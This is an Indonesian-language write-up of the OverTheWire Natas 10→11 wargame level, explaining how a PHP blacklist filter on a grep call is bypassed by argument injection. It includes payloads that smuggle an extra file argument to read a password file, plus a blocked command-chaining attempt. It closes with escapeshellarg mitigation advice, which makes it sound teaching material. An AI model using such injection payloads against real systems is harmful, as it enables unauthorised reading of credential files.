# Natas 10 → Natas 11

## 🎯 Objective

Mendapatkan password untuk level Natas 11.

## 🔎 Initial Analysis

Saat kita membuka halaman ini untuk pertama kali Terdapat pesan "For security reasons, we now filter on certain characters", yang mengindikasikan bahwa *developer* telah berusaha mencegah kerentanan *OS Command Injection* dari level sebelumnya. 

Melihat *source code* yang diberikan, aplikasi sekarang menggunakan fungsi *RegEx* (Regular Expression) untuk memblokir beberapa karakter spesial.

## 🧠 Vulnerability / Concept

**Concept:** Argument Injection (Bypass Command Injection Filter)

Meskipun *developer* telah memblokir karakter yang digunakan untuk menyambung perintah (seperti `;`, `|`, dan `&`), mereka masih memasukkan input pengguna langsung ke dalam argumen suatu perintah tanpa validasi atau *escaping* yang tepat. 

Alih-alih mencoba mengeksekusi perintah *shell* baru, kita dapat memanfaatkan cara kerja utilitas itu sendiri (dalam hal ini, `grep`). `grep` mendukung pencarian pada lebih dari satu file secara bersamaan jika nama file-file tersebut dipisahkan oleh spasi.

## 🔬 Source / Page Analysis

Bagian PHP yang relevan:
```php
if(preg_match('/[;|&]/',$key)) {
    print "Input contains an illegal character!";
} else {
    passthru("grep -i $key dictionary.txt");
}
```

## Analisis 

1. Apa fungsi preg_match di sini?
Fungsi ini digunakan sebagai sistem blacklist. Ia memeriksa apakah input pengguna ($key) mengandung karakter ;, |, atau &. Jika ada, eksekusi dihentikan. Hal ini efektif mencegah kita melakukan command chaining seperti di Natas 09.

Mengapa masih rentan?
Struktur perintah dasarnya adalah grep -i [INPUT_KITA] dictionary.txt.
Sintaks asli grep adalah: grep [opsi] [pola_pencarian] [file1] [file2] ...
Karena input kita tidak diapit tanda kutip (seperti "$key" atau '$key'), kita bisa menggunakan karakter spasi ( ) untuk memecah input menjadi beberapa argumen. Kita bisa memberikan sebuah pola pencarian, diikuti dengan spasi, lalu memasukkan path absolut file target sebagai file tambahan yang akan dibaca oleh grep.

## 🧪 Investigation

Percobaan:

1. Request normal:
Input: hello
Sistem mengeksekusi: grep -i hello dictionary.txt
Response: Menampilkan baris yang mengandung "hello" dari dictionary.txt.
Output:
hello
hello's
hellos

2. Request gagal (Terblokir):
Input: ; cat /etc/natas_webpass/natas11
Response: Input contains an illegal character! (Karena karakter ; terdeteksi).

3. Request exploit (Argument Injection):
Kita menggunakan pola pencarian yang pasti cocok dengan apa saja (misalnya regex . untuk sembarang karakter), lalu dipisahkan spasi, diikuti nama file target.
Input: . /etc/natas_webpass/natas11
Output:
/etc/natas_webpass/natas11:VUMQDmuITOEHzhv............
dictionary.txt:African
dictionary.txt:Africans
dictionary.txt:Allah
dictionary.txt:Allah's
...

## 💡 Exploitation

Masukkan payload berikut ke dalam kolom "Find words containing:"

```Bash
. /etc/natas_webpass/natas11
```

Bagaimana ini bekerja di backend?
Saat dikirim, perintah yang dieksekusi oleh server menjadi:

```Bash
grep -i . /etc/natas_webpass/natas11 dictionary.txt
```

1. grep menganggap . sebagai pola pencarian (berarti: cari karakter apa saja).

2. grep menganggap /etc/natas_webpass/natas11 sebagai file pertama yang harus dicari.

3. grep menganggap dictionary.txt sebagai file kedua yang harus dicari.

Karena format grep ketika mencari di banyak file secara default akan menampilkan nama file sebelum hasil temuan, outputnya akan membocorkan isi file tersebut langsung ke layar.

## Hasil

Output:
/etc/natas_webpass/natas11:VUMQDmuITOEHzhv............
dictionary.txt:African
dictionary.txt:Africans
dictionary.txt:Allah
dictionary.txt:Allah's

## 🛡️ Mitigation

1. Blacklisting tidak pernah cukup: Mencoba memblokir karakter jahat (blacklist) sering kali tidak efektif karena penyerang selalu menemukan jalan memutar atau teknik injeksi alternatif.

2. Gunakan fungsi escaping yang tepat: Jika Anda harus menggabungkan input pengguna ke dalam perintah shell, gunakan fungsi bawaan PHP escapeshellarg().

```PHP
$safe_key = escapeshellarg($key);
passthru("grep -i " . $safe_key . " dictionary.txt");
```
Fungsi ini akan menambahkan tanda kutip tunggal di sekitar input dan melakukan escape jika diperlukan, sehingga grep akan memperlakukan seluruh input (termasuk spasi dan karakter khusus) hanya sebagai satu string pola pencarian murni.

## 📚 Yang Saya Pelajari

1. Pendekatan Blacklisting (memblokir karakter tertentu) rentan diakali (bypass).

2. Teknik Argument Injection, di mana kita memanipulasi behavior dari suatu program bawaan sistem operasi (seperti grep, tar, atau find) tanpa harus menyisipkan perintah (command) baru.

3. Pentingnya mengamankan setiap argumen dalam pemanggilan fungsi sistem menggunakan escaping parametrik.